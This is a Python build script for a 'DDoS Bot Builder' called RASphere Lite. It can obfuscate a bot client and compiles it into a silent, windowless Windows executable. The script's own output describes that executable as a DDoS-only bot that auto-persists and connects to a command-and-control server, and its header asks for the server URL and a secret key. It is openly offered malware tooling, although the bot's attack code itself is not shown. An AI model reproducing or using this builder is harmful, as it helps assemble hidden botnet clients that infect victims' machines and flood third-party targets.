#!/usr/bin/env python3
"""
RASphere Lite - DDoS Bot Builder
=================================
Compiles client_lite.py to standalone .exe

Usage: python build_client_lite.py [--no-obfuscate]

Before building, edit these variables in client_lite.py:
    _SERVER  = "https://your-server.com"
    _SECRET  = "your-secret-key"
"""

import os, sys, subprocess

def main():
    use_obf = "--no-obfuscate" not in sys.argv

    print("=" * 50)
    print("  RASphere Lite - DDoS Bot Builder")
    print("=" * 50)

    # Ensure PyInstaller installed
    try:
        import PyInstaller
    except ImportError:
        print("[*] Installing PyInstaller...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])

    source = "client_lite.py"

    # Step 1: Obfuscate
    if use_obf and os.path.exists("obfuscator.py"):
        print("\n[*] Step 1: Obfuscating...")
        r = subprocess.run([sys.executable, "obfuscator.py", "--input", source, "--output", "obfuscated_lite.py"])
        if r.returncode != 0:
            print("[!] Obfuscation failed, using original file")
            source = "client_lite.py"
        else:
            source = "obfuscated_lite.py"
    else:
        print("\n[*] Skipping obfuscation")
        source = "client_lite.py"

    # Step 2: Build .exe
    print(f"\n[*] Step 2: Compiling {source} -> .exe...")
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole",
        "--name", "RASphereLite",
        "--hidden-import", "socketio",
        "--hidden-import", "engineio",
        "--hidden-import", "winreg",
        "--clean", source
    ]

    r = subprocess.run(cmd)
    if r.returncode == 0:
        print(f"\n[+] SUCCESS: dist/RASphereLite.exe")
        print(f"\n    DDoS-only bot. Runs silently, auto-persists.")
        print(f"    Connects to the same C2 server as main client.")
    else:
        print(f"\n[!] Build failed")
        sys.exit(1)

    # Cleanup obfuscated file
    if use_obf and os.path.exists("obfuscated_lite.py"):
        try: os.remove("obfuscated_lite.py")
        except: pass

if __name__ == "__main__":
    main()
